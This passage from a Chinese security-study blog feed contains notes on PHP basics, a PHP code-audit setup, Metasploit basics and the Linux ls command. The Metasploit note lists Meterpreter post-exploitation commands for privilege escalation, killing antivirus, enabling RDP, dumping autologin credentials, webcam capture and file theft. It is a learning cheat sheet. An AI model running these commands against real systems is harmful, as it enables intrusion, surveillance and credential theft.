<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">1</span>&gt;</span></span><br><span class="line">	<span class="php"><span class="meta">&lt;?php</span> <span class="keyword">for</span>($i = <span class="number">1</span>;$i &lt; <span class="number">10</span>;$i++)&#123;<span class="meta">?&gt;</span></span></span><br><span class="line">		<span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">			<span class="php"><span class="meta">&lt;?php</span> <span class="keyword">for</span>($j = <span class="number">1</span>;$j &lt;= $i;$j++)&#123;<span class="meta">?&gt;</span></span></span><br><span class="line">				<span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">					<span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $i . <span class="string">' * '</span> . $j . <span class="string">' = '</span> . $i * $j;<span class="meta">?&gt;</span></span></span><br><span class="line">				<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">			<span class="php"><span class="meta">&lt;?php</span> &#125;<span class="meta">?&gt;</span></span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">	<span class="php"><span class="meta">&lt;?php</span> &#125;<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>在php书写到html中的这些大括号{}非常不美观，所以php提供了一种代替机制，让其可以不用书写大括号：<br>for(;;){ 可以替代为 for(;;):</p>
<p>}        可以替代为 endfor;</p>
<h4 id="浮点类型-1"><a href="#浮点类型-1" class="headerlink" title="浮点类型"></a>浮点类型</h4><pre><code>浮点型：小数类型以及超过整型所能存储范围的证书（不保证精度），精度范围大概在15个有效数字左右

浮点型定义有两种方式
$f = 1.23;
$f = 1.23e10 //科学计数法，其中e表示底10   1.23乘以十的十次方</code></pre><h4 id="布尔类型-1"><a href="#布尔类型-1" class="headerlink" title="布尔类型"></a>布尔类型</h4><pre><code>布尔类型：两个值true和false，通常适用于判断比较

在进行某些数据判断的时候，需要特别注意类型转换
empty(): 判断数据的值是否为“空”，不是NULL，如果为空返回true，不为空返回false
lsset(): 判断数据存储的变量本身是否存在，存在变量返回true，不存在返回false</code></pre><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><h4 id="函数的基本概念"><a href="#函数的基本概念" class="headerlink" title="函数的基本概念"></a>函数的基本概念</h4><p>函数：function，是一种语法结构，将实现某一个功能的代码块（多行代码）封装到一个结构中，从而实现代码的重复利用</p>
<h4 id="函数定义语法"><a href="#函数定义语法" class="headerlink" title="函数定义语法"></a>函数定义语法</h4><pre><code>函数有几个对应的关键点：function关键字、函数名、参数（形参和实参）、函数体和返回值

基本语法如下：
function函数名(参数){
    //函数体
    //返回值：return 结果;
}

定义函数的目的：是为了实现代码的重复利用，一个功能用一个函数来实现（简单利用）
函数的使用：通过访问函数的名字+(); //如果函数在定义的过程中有参数，那么在调用的时候就必须传入对应的参数:函数是一种结构不会自动运行，必须通过调用才会执行</code></pre><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">	<span class="comment">//函数</span></span></span><br><span class="line"></span><br><span class="line"><span class="php">	<span class="comment">//定义函数</span></span></span><br><span class="line"><span class="php">	<span class="function"><span class="keyword">function</span> <span class="title">display</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">		<span class="comment">//函数体</span></span></span><br><span class="line"><span class="php">		<span class="keyword">echo</span> <span class="string">'hello word'</span>;</span></span><br><span class="line"><span class="php">	&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">	<span class="comment">//调用函数</span></span></span><br><span class="line"><span class="php">	display();</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>


<h4 id="函数命名规范"><a href="#函数命名规范" class="headerlink" title="函数命名规范"></a>函数命名规范</h4><pre><code>命名规范：由字母、数字和下划线组成，但不能以数字开头
函数作为常用结构，一般遵循以下规则：
    1、 驼峰法：除了第一个单词外，后面所有的单词首字母都大写：showParentinfo()
    2、 下划线法：单词之间通过下划线链接，单词都是小写：show_parent_info()

函数名字：在一个脚本周期中，不允许出现同名函数（通常在一个系统开发中都不会）</code></pre><h4 id="参数详解"><a href="#参数详解" class="headerlink" title="参数详解"></a>参数详解</h4><pre><code>函数的参数分为两种：形参和实参</code></pre><h5 id="形参"><a href="#形参" class="headerlink" title="形参"></a>形参</h5><pre><code>形参：形式参数，不具有实际意义的参数，是在函数定义是使用的参数</code></pre><h5 id="实参"><a href="#实参" class="headerlink" title="实参"></a>实参</h5><pre><code>实参：实际参数，具有实际意义的参数，是在函数调用时使用的参数
形参实施惨的载体：实参在调用时通常需要传入到函数内部参与计算（运算），那么需要在函数内部去找到实际数据所在的位置才能找到数据本身：需要实际调用的时候，将数据以实参形式传递给形参，给形参赋值，从而使得函数内部可以用到外部数据</code></pre><h5 id="默认值"><a href="#默认值" class="headerlink" title="默认值"></a>默认值</h5><pre><code>默认值： default value，指的是形参的默认值，在函数定义的时候，就给形参进行初始赋值：如果实际调用传入的实参没有提供，那么形参就会使用定义时的值来进入函数内部参与运算。

通常默认值使用在一些，一定会有某个数据参与，单数可能通常是某个我们知道的值。</code></pre><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$t = <span class="number">10</span> ;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//函数默认值</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">tm</span><span class="params">($t = <span class="number">0</span>,$m = <span class="number">0</span>)</span>  </span>&#123;<span class="comment">//当前的$t是形参，在编译时不执行，即使执行也是在tm函数内部，不会与外部的$t变量冲突</span></span><br><span class="line">		<span class="keyword">echo</span> $t - $m;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//调用：默认值如果存在，可以不用传入</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//调用：默认值如果存在，可以不用传入</span></span><br><span class="line"></span><br><span class="line">tm($t);</span><br><span class="line"><span class="keyword">echo</span> $t;</span><br></pre></td></tr></table></figure>


<pre><code>注意事项：
    1、 默认值的定义是放在最后边的（多个），不能左边形参有默认值，但是右边没有
    函数外部定义的变量名字与函数定义的形参名字冲突（同名）是没有任何关联关系的；如果多个函数使用同样的形参名字也不冲突。</code></pre><h5 id="引用传递"><a href="#引用传递" class="headerlink" title="引用传递"></a>引用传递</h5><pre><code>实参在调用时会将值赋值给形参，那么实际上使用的方式就是一种简单的值传递：将实参（如果是变量或者常量或者其他表达式）的结果（值）取出来赋值给形参：形参与外部实际传入的参数本身没有任何关联关系：只是结果一样。

有的时候，希望在函数内部拿到的外部数据，能够在函数内部改变，那么就需要明确告知函数（定义时），函数才会调用的时候去主动获取外部数据的内存地址。以上这种定义形式参数的方式叫做引用传值。

基本定义语法：

function 函数名（形参1，&amp;形参2）{
    //函数体
}

在调用的时候，必须给引用传值的参数位置传入实际参数，而且参数本身必须是变量。（变量才有指向的数据的内存地址）</code></pre><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">display</span><span class="params">($a,&amp;$b)</span></span>&#123;</span><br><span class="line">		<span class="comment">//修改形参的值</span></span><br><span class="line">		$a = $a * $a;</span><br><span class="line">		$b = $b * $b;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">echo</span> $a,<span class="string">'&lt;br/&gt;'</span>,$b,<span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//定义变量</span></span><br><span class="line">	$a = <span class="number">10</span>;</span><br><span class="line">	$b = <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//调用函数</span></span><br><span class="line">	display($a,$b);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;hr/&gt;'</span>,$a,<span class="string">'&lt;br/&gt;'</span>,$b;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//输入后 值为  100    25   10   25</span></span><br></pre></td></tr></table></figure>

<h4 id="函数体"><a href="#函数体" class="headerlink" title="函数体"></a>函数体</h4><pre><code>函数体：函数内部（大括号{}里面）的所有代码都称之为函数体

函数体：基本上所有代码都可以实现
    1、 定义变量
    2、 定义常量
    3、 使用流程控制（分支、循环）
    4、 可以调用函数</code></pre><h4 id="函数返回值"><a href="#函数返回值" class="headerlink" title="函数返回值"></a>函数返回值</h4><pre><code>返回值：return，指的是将函数实现的结果，通过return关键字，返回给函数外部（函数调用处）：在php中所有的函数都有返回值。（如果没有明确return使用，那么系统默认返回NULL）

返回值作用：将计算结果返回给调用处

注意：函数的返回值可以是任意类型

return关键字：
    1、 return在函数内部存在的价值：返回当前函数结果（当前函数运行结束）
    2、 return还可以在文件中直接使用（不在函数里面）：代表文件将结果return后面跟的内容，转交给包含当前文件的位置</code></pre><h4 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h4><pre><code>作用域：变量（常量）能够被访问的区域
    1、 变量可以再普通代码中定义
    2、 变量也可以在函数内部定义

在php中作用域严格来说分为两种：但是php内部还定义一些严格意义之外的一种，所以总共三种：
    1、 全局变量：就是用户普通定义的变量（函数外部定义）
        所属全局空间：在php中只允许在全局空间使用：理论上函数内部不可访问
        脚本周期：直到脚本运行结束（函数外部定义）
    2、 局部变量：就是在函数内部的变量
        所属当前函数空间：在php中只允许在当前函数自己内部使用
        函数周期：函数执行结束（函数是在栈区中开辟独立内存空间运行）
    3、 超全局变量：系统定义的变量（预定义变量：$_SERVER、$POST等）
        所属超全局空间：没有访问限制（函数以外都可以访问）
    超全局变量    </code></pre><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">	<span class="regexp">//</span>php中作用域</span><br><span class="line"></span><br><span class="line">	<span class="regexp">//</span>默认的代码空间：全局空间</span><br><span class="line">	<span class="variable">$global</span> = <span class="string">'global area'</span>;	<span class="regexp">//</span>最终会被系统纳入到超全局变量中:<span class="variable">$GLOBALS</span>[<span class="string">'global'</span>] = global area;</span><br><span class="line"></span><br><span class="line">	<span class="regexp">//</span>局部变量（函数内部定义）</span><br><span class="line">	<span class="keyword">function</span> display()&#123;</span><br><span class="line">		<span class="regexp">//</span>所有的形参都可以理解为局部变量</span><br><span class="line">		<span class="variable">$inner</span> = __FUNCTION__;	<span class="regexp">//</span>局部变量</span><br><span class="line"></span><br><span class="line">		<span class="regexp">//</span>访问全局变量</span><br><span class="line">		<span class="regexp">//</span>echo <span class="variable">$global</span>;	<span class="regexp">//</span>不能访问</span><br><span class="line"></span><br><span class="line">		<span class="regexp">//</span>访问全局变量</span><br><span class="line">		<span class="regexp">//</span>ver_dump(<span class="variable">$GLOBALS</span>);</span><br><span class="line">		echo <span class="variable">$GLOBALS</span>[<span class="string">'global'</span>];	<span class="regexp">//</span>可以访问</span><br><span class="line"></span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="regexp">//</span>调用函数</span><br><span class="line">	display();</span><br><span class="line"></span><br><span class="line">	<span class="regexp">//</span>全局变量访问局部变量</span><br><span class="line">	<span class="regexp">//</span>echo <span class="variable">$inner</span>;	<span class="regexp">//</span>不能访问</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<pre><code>如果想</code></pre><h3 id="常用系统函数"><a href="#常用系统函数" class="headerlink" title="常用系统函数"></a>常用系统函数</h3><h4 id="有关输出的函数"><a href="#有关输出的函数" class="headerlink" title="有关输出的函数"></a>有关输出的函数</h4><p>print():类似于echo输出提供的内容，本质是一种结构（不是函数），返回1，可以不需要使用括号<br>print_r()：类似于ver_dump，但是比ver_dump简单，不会输出数据的类型，只会输出值（数组打印使用比较多）</p>
<h4 id="有关时间的函数"><a href="#有关时间的函数" class="headerlink" title="有关时间的函数"></a>有关时间的函数</h4><p>date():按照指定格式对对应的时间戳（从1970年格林威治时间开始计算秒数）<br>time():获取当前时间对应的时间戳<br>microtime()：获取微秒级别的时间</p>
<h4 id="有关数学的函数"><a href="#有关数学的函数" class="headerlink" title="有关数学的函数"></a>有关数学的函数</h4><p>max()<br>min()<br>rand()</p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP代码审计笔记</title>
    <url>/posts/803f4340.html</url>
    <content><![CDATA[<h2 id="代码审计环境准备"><a href="#代码审计环境准备" class="headerlink" title="代码审计环境准备"></a>代码审计环境准备</h2><p>PHPStudy<br>sublime<br>    CTage、ConvertToUTF8<br>firefox<br>    FoxyProxy、hackbar<br>burp suite<br>vMysqlMonitoring<br>WEB编码转换工具</p>
<a id="more"></a>
<h2 id="常见的INI配置"><a href="#常见的INI配置" class="headerlink" title="常见的INI配置"></a>常见的INI配置</h2><p>配置文件<br>    php.ini<br>        在php启动时被读取。对于服务器模块版本的php，仅在web服务器启动时读取一次。对于CGI和CLI版本，每次调用都会读取。<br>        * Apache web 服务器在启动时会把目录转到根目录，这将导致php尝试在根目录下读取php.ini，如果存在的话。<br>        * 在php.ini中可以使用环境变量。<br>    .user.ini 文件<br>        自PHP5.3.0起，php支持基于每个目录的.htaccess风格的INI文件仅被CGI/FastCGI SAPI处理。此功能使得PECL的htscanner扩展作废。如果使用Apache，则用.htaccess文件有同样效果<br>语法<br>    该文件的语法非常简单。空白字符和以分号开始的行被简单的忽略，即使将来它们可能有某种意义。<br>    设置指令的格式如下：<br>        directive = value<br>    指令名(directive)是大小写敏感的！<br>    值(value)可以是:<br>    - 用引号界定的字符串(如:”foo”)<br>    - 一个数字(整数或浮点数，如:0,1,-1,1.111)<br>    - 一个PHP常量(如:E_ALL,M_PI)<br>    - 一个INI常量(On,Off,none)<br>    - 一个表达式(如：E_ALL &amp; ~E_NOTICE)</p>
<p>变量相关<br>安全模式<br>上传文件及目录权限<br>错误信息<br>魔术引导及远程文件<br>(未完)</p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>Metasploit基础</title>
    <url>/posts/39fd836c.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Metasploit就是一个漏洞框架。它的全称叫做The Metasploit Framework，简称叫做MSF（美少妇）。Metasploit作为全球最受欢迎的工具，</p>
<p>不仅仅是因为它的方便性和强大性，更重要的是它的框架。它允许使用者开发自己的漏洞脚本，从而进行测试。</p>
<a id="more"></a>
<h2 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h2><h3 id="专业术语"><a href="#专业术语" class="headerlink" title="专业术语"></a>专业术语</h3><ul>
<li>Auxiliarity（辅助模块）<pre><code>只负责执行扫描，嗅探，指纹识别等相关功能以辅助渗透测试</code></pre></li>
<li>Expoit（漏洞利用模块）<pre><code>漏洞利用是指由渗透测试者利用一个系统，应用或者服务中的安全漏洞进行的攻击行为。流行的渗透攻击包括缓冲区溢出，Web应用程序攻击，以及利用配置错误等，其中包含攻击者或测试人员针对系统的中的漏洞而设计的各种POC验证程序，用于破坏系统安全性的攻击代码，每个漏洞都有相应的攻击代码。</code></pre></li>
<li>Payload(攻击载荷模块）<pre><code>攻击载荷是我们期望目标系统在被渗透攻击之后完成攻击功能的代码，成功渗透目标后，用于在目标系统上运行任意命令或执行特定代码，在Metasploit框架中可以自由选择，传送和植入。攻击载荷也可能是简单的在目标操作系统上执行一些命令，如添加用户账号 </code></pre></li>
<li>Post(后期渗透模块)<pre><code>该模块用于取得目标系统远程控制权后，进行一系列后渗透攻击动作，如获取敏感信息，实施跳板攻击等。   </code></pre></li>
<li>Encoders(编码工具模块)<pre><code>负责免杀，以防止被杀毒软件，防火墙，IDS及类似安全软件检测出来。</code></pre></li>
</ul>
<h3 id="渗透攻击步骤"><a href="#渗透攻击步骤" class="headerlink" title="渗透攻击步骤"></a>渗透攻击步骤</h3><pre><code>侦察并发动攻击
    扫描目标机系统，寻找可用漏洞
    选择并配置一个漏洞利用模块
    选择并配置一个攻击载荷模块
    选择一个编码技术，用来绕过杀毒软件的查杀
    渗透攻击</code></pre><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">search	<span class="comment">//根据关键字搜索模块</span></span><br><span class="line">use	<span class="comment">//进入某渗透攻击模块</span></span><br><span class="line">show <span class="keyword">options</span>	<span class="comment">//查看该模块所有可用选项</span></span><br><span class="line"><span class="keyword">set</span> RHOSTS	//设置</span><br><span class="line">sessions    //会话管理</span><br></pre></td></tr></table></figure>


<h3 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h3><p>终端中输入<code>msfconsole</code></p>
<h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">gituid    <span class="comment">//查看权限</span></span><br><span class="line">getsystem    <span class="comment">//提权到system权限</span></span><br><span class="line">background    <span class="comment">//后台session</span></span><br><span class="line">ps    <span class="comment">//获取目标机正运行的进程</span></span><br><span class="line">getpid      <span class="comment">//查看Meterpreter Shell的进程号</span></span><br><span class="line">migrate 786   <span class="comment">//将shell迁移到PID为786的进程中</span></span><br><span class="line"><span class="keyword">run</span> <span class="keyword">post</span>/windows/manage/killav        <span class="comment">//关闭杀软</span></span><br><span class="line"><span class="keyword">run</span> <span class="keyword">post</span>/windows/manage/enable_rdp    <span class="comment">//开启目标远程桌面</span></span><br><span class="line">route add IP 子网掩码    <span class="comment">//添加路由，先background</span></span><br><span class="line"><span class="keyword">run</span> <span class="keyword">post</span>/windows/gather/enum_logged_on_users    <span class="comment">//列举当前登陆用户</span></span><br><span class="line"><span class="keyword">run</span> <span class="keyword">post</span>/windows/gather/enum_applications        <span class="comment">//列举应用程序</span></span><br><span class="line"><span class="keyword">run</span> windows/gather/credentials/windows_autologin    <span class="comment">//列举自动登陆的用户名和密码</span></span><br><span class="line">screenshot        <span class="comment">//抓取截屏</span></span><br><span class="line">webcam_list        <span class="comment">//摄像头列表</span></span><br><span class="line">webcam_snap        <span class="comment">//摄像头拍照</span></span><br><span class="line">webcam_stream    <span class="comment">//抓取视频</span></span><br><span class="line"><span class="keyword">shell</span>            <span class="comment">//进入目标机shell，exit退出she</span></span><br><span class="line">download c:\<span class="keyword">test</span>.txt/root  <span class="comment">//下载目标机C盘的test.txt文件到攻击机root下</span></span><br><span class="line">upload /root/<span class="keyword">test</span>.txt c:\  <span class="comment">//上传攻击机root目录下test.txt文件到目标机C盘下</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>Metasploit</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux常用命令</title>
    <url>/posts/d0edc1ed.html</url>
    <content><![CDATA[<h2 id="ls命令"><a href="#ls命令" class="headerlink" title="ls命令"></a>ls命令</h2><p>ls命令用来显示目标列表，在Linux中是使用率较高的命令。ls命令的输出信息可以进行彩色加亮显示，以分区不同类型的文件。</p>
<a id="more"></a>
<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ls</span>（选项）（参数）</span><br></pre></td></tr></table></figure>
<h3 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">-a：显示所有档案及目录（ls内定将档案名或目录名称为“.”的视为影藏，不会列出）；</span><br><span class="line">-A：显示除影藏文件“.”和“..”以外的所有文件列表；</span><br><span class="line">-C：多列显示输出结果。这是默认选项；</span><br><span class="line">-l：与“-C”选项功能相反，所有输出信息用单列格式输出，不输出为多列；</span><br><span class="line">-F：在每个输出项后追加文件的类型标识符，具体含义：“*”表示具有可执行权限的普通文件，“/”表示目录，“@”表示符号链接，“|”表示命令管道FIFO，“=”表示sockets套接字。当文件为普通文件时，不输出任何标识符；</span><br><span class="line">-b：将文件中的不可输出的字符以反斜线“”加字符编码的方式输出；</span><br><span class="line">-c：与“-lt”选项连用时，按照文件状态时间排序输出目录内容，排序的依据是文件的索引节点中的ctime字段。与“-l”选项连用时，则排序的一句是文件的状态改变时间；</span><br><span class="line">-d：仅显示目录名，而不显示目录下的内容列表。显示符号链接文件本身，而不显示其所指向的目录列表；</span><br><span class="line">-f：此参数的效果和同时指定“aU”参数相同，并关闭“lst”参数的效果；</span><br><span class="line">-i：显示文件索引节点号（inode）。一个索引节点代表一个文件；</span><br><span class="line">--file-<span class="built_in">type</span>：与“-F”选项的功能相同，但是不显示“*”；</span><br><span class="line">-k：以KB（千字节）为单位显示文件大小；</span><br><span class="line">-l：以长格式显示目录下的内容列表。输出的信息从左到右依次包括文件名，文件类型、权限模式、硬连接数、所有者、组、文件大小和文件的最后修改时间等；</span><br><span class="line">-m：用“,”号区隔每个文件和目录的名称；</span><br><span class="line">-n：以用户识别码和群组识别码替代其名称；</span><br><span class="line">-r：以文件名反序排列并输出目录内容列表；</span><br><span class="line">-s：显示文件和目录的大小，以区块为单位；</span><br><span class="line">-t：用文件和目录的更改时间排序；</span><br><span class="line">-L：如果遇到性质为符号链接的文件或目录，直接列出该链接所指向的原始文件或目录；</span><br><span class="line">-R：递归处理，将指定目录下的所有文件及子目录一并处理；</span><br><span class="line">--full-<span class="built_in">time</span>：列出完整的日期与时间；</span><br><span class="line">--<span class="built_in">color</span>[=WHEN]：使用不同的颜色高亮显示不同类型的。</span><br><span class="line">白色：表示普通文件</span><br><span class="line">蓝色：表示目录</span><br><span class="line">绿色：表示可执行文件</span><br><span class="line">红色：表示压缩文件</span><br><span class="line">浅蓝色：链接文件</span><br><span class="line">红色闪烁：表示链接的文件有问题</span><br><span class="line">黄色：表示设备文件</span><br><span class="line">灰色：表示其它文件</span><br></pre></td></tr></table></figure>
<h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><p>目录：指定要显示列表的目录，也可以是具体的文件。</p>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>显示当前目录下非隐藏文件与目录</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-attr">[root@localhost ~]</span># <span class="selector-tag">ls</span></span><br><span class="line"><span class="selector-tag">anaconda-ks</span><span class="selector-class">.cfg</span>  <span class="selector-tag">install</span><span class="selector-class">.log</span>  <span class="selector-tag">install</span><span class="selector-class">.log</span><span class="selector-class">.syslog</span>  <span class="selector-tag">satools</span></span><br></pre></td></tr></table></figure>
<p>显示当前目录下包括隐藏文件在内的所有文件列表</p>
<figure class="highlight plain"><figcaption><span>~]# ls -a</span></figcaption><table><tr><td class="code"><pre><span class="line">.   anaconda-ks.cfg  .bash_logout   .bashrc  install.log         .mysql_history  satools  .tcshrc   .vimrc</span><br><span class="line">..  .bash_history    .bash_profile  .cshrc   install.log.syslog  .rnd            .ssh     .viminfo</span><br></pre></td></tr></table></figure>
<p>输出长格式列表</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-attr">[root@localhost ~]</span># <span class="selector-tag">ls</span> <span class="selector-tag">-1</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">anaconda-ks</span><span class="selector-class">.cfg</span></span><br><span class="line"><span class="selector-tag">install</span><span class="selector-class">.log</span></span><br><span class="line"><span class="selector-tag">install</span><span class="selector-class">.log</span><span class="selector-class">.syslog</span></span><br><span class="line"><span class="selector-tag">satools</span></span><br></pre></td></tr></table></figure>
<p>显示文件的inode信息</p>
<p>索引节点（index inode简称为“inode”）是Linux中一个特殊的概念，具有相同的索引节点号的两个文本本质上是同一个文件（除文件名不同外）。</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">[<span class="symbol">root@</span>localhost ~]# ls -i -l anaconda-ks.cfg install.log</span><br><span class="line"><span class="number">2345481</span> -rw------- <span class="number">1</span> root root   <span class="number">859</span> Jun <span class="number">11</span> <span class="number">22</span>:<span class="number">49</span> anaconda-ks.cfg</span><br><span class="line"><span class="number">2345474</span> -rw-r--r-- <span class="number">1</span> root root <span class="number">13837</span> Jun <span class="number">11</span> <span class="number">22</span>:<span class="number">49</span> install.log</span><br></pre></td></tr></table></figure>
<p>水平输出文件列表</p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">[root@localhost /]<span class="comment"># ls -m</span></span><br><span class="line"></span><br><span class="line">bin, boot, data, dev, etc, home, <span class="class"><span class="keyword">lib</span>, <span class="title">lost</span>+<span class="title">found</span>, <span class="title">media</span>, <span class="title">misc</span>, <span class="title">mnt</span>, <span class="title">opt</span>, <span class="title">proc</span>, <span class="title">root</span>, <span class="title">sbin</span>, <span class="title">selinux</span>, <span class="title">srv</span>, <span class="title">sys</span>, <span class="title">tmp</span>, <span class="title">usr</span>, <span class="title">var</span></span></span><br></pre></td></tr></table></figure>
<p>修改最后一次编辑的文件</p>
<p>最近修改的文件显示在最上面。</p>
<figure class="highlight tcl"><table><tr><td class="code"><pre><span class="line">[root@localhost /]# ls -t</span><br><span class="line"></span><br><span class="line">tmp  root  etc  dev  lib  boot  sys  <span class="keyword">proc</span><span class="title">  data</span> <span class="title"> home</span> <span class="title"> bin</span> <span class="title"> sbin</span> <span class="title"> usr</span> <span class="title"> var</span> <span class="title"> lost+found</span> <span class="title"> media</span> <span class="title"> mnt</span> <span class="title"> opt</span> <span class="title"> selinux</span> <span class="title"> srv</span> <span class="title"> misc</span></span><br></pre></td></tr></table></figure>
<p>列出文件和文件夹的详细信息</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">[<span class="symbol">root@</span>localhost /]# ls -l</span><br><span class="line"></span><br><span class="line">total <span class="number">254</span></span><br><span class="line">drwxr-xr-x   <span class="number">2</span> root root  <span class="number">4096</span> Jun <span class="number">12</span> <span class="number">04</span>:<span class="number">03</span> bin</span><br><span class="line">drwxr-xr-x   <span class="number">4</span> root root  <span class="number">1024</span> Jun <span class="number">15</span> <span class="number">14</span>:<span class="number">45</span> boot</span><br><span class="line">drwxr-xr-x   <span class="number">6</span> root root  <span class="number">4096</span> Jun <span class="number">12</span> <span class="number">10</span>:<span class="number">26</span> data</span><br><span class="line">drwxr-xr-x  <span class="number">10</span> root root  <span class="number">3520</span> Sep <span class="number">26</span> <span class="number">15</span>:<span class="number">38</span> dev</span><br><span class="line">drwxr-xr-x  <span class="number">75</span> root root  <span class="number">4096</span> Oct <span class="number">16</span> <span class="number">04</span>:<span class="number">02</span> etc</span><br><span class="line">drwxr-xr-x   <span class="number">4</span> root root  <span class="number">4096</span> Jun <span class="number">12</span> <span class="number">10</span>:<span class="number">26</span> home</span><br><span class="line">drwxr-xr-x  <span class="number">14</span> root root <span class="number">12288</span> Jun <span class="number">16</span> <span class="number">04</span>:<span class="number">02</span> lib</span><br><span class="line">drwx------   <span class="number">2</span> root root <span class="number">16384</span> Jun <span class="number">11</span> <span class="number">22</span>:<span class="number">46</span> lost+found</span><br><span class="line">drwxr-xr-x   <span class="number">2</span> root root  <span class="number">4096</span> May <span class="number">11</span>  <span class="number">2011</span> media</span><br><span class="line">drwxr-xr-x   <span class="number">2</span> root root  <span class="number">4096</span> Nov  <span class="number">8</span>  <span class="number">2010</span> misc</span><br><span class="line">drwxr-xr-x   <span class="number">2</span> root root  <span class="number">4096</span> May <span class="number">11</span>  <span class="number">2011</span> mnt</span><br><span class="line">drwxr-xr-x   <span class="number">2</span> root root  <span class="number">4096</span> May <span class="number">11</span>  <span class="number">2011</span> opt</span><br><span class="line">dr-xr-xr-x <span class="number">232</span> root root     <span class="number">0</span> Jun <span class="number">15</span> <span class="number">11</span>:<span class="number">04</span> proc</span><br><span class="line">drwxr-x---   <span class="number">4</span> root root  <span class="number">4096</span> Oct <span class="number">15</span> <span class="number">14</span>:<span class="number">43</span> root</span><br><span class="line">drwxr-xr-x   <span class="number">2</span> root root <span class="number">12288</span> Jun <span class="number">12</span> <span class="number">04</span>:<span class="number">03</span> sbin</span><br><span class="line">drwxr-xr-x   <span class="number">2</span> root root  <span class="number">4096</span> May <span class="number">11</span>  <span class="number">2011</span> selinux</span><br><span class="line">drwxr-xr-x   <span class="number">2</span> root root  <span class="number">4096</span> May <span class="number">11</span>  <span class="number">2011</span> srv</span><br><span class="line">drwxr-xr-x  <span class="number">11</span> root root     <span class="number">0</span> Jun <span class="number">15</span> <span class="number">11</span>:<span class="number">04</span> sys</span><br><span class="line">drwxrwxrwt   <span class="number">3</span> root root <span class="number">98304</span> Oct <span class="number">16</span> <span class="number">08</span>:<span class="number">48</span> tmp</span><br><span class="line">drwxr-xr-x  <span class="number">13</span> root root  <span class="number">4096</span> Jun <span class="number">11</span> <span class="number">23</span>:<span class="number">38</span> usr</span><br><span class="line">drwxr-xr-x  <span class="number">19</span> root root  <span class="number">4096</span> Jun <span class="number">11</span> <span class="number">23</span>:<span class="number">38</span> var</span><br></pre></td></tr></table></figure>
<h2 id="mv命令"><a href="#mv命令" class="headerlink" title="mv命令"></a>mv命令</h2><p>mv命令用来对文件或目录重新命名，或者将文件从一个目录移到另一个目录中。source表示源文件或目录，target表示目标文件或目录。如果将一个文件移到一个已经存在的目标文件中，则目标文件的内容将被覆盖。</p>
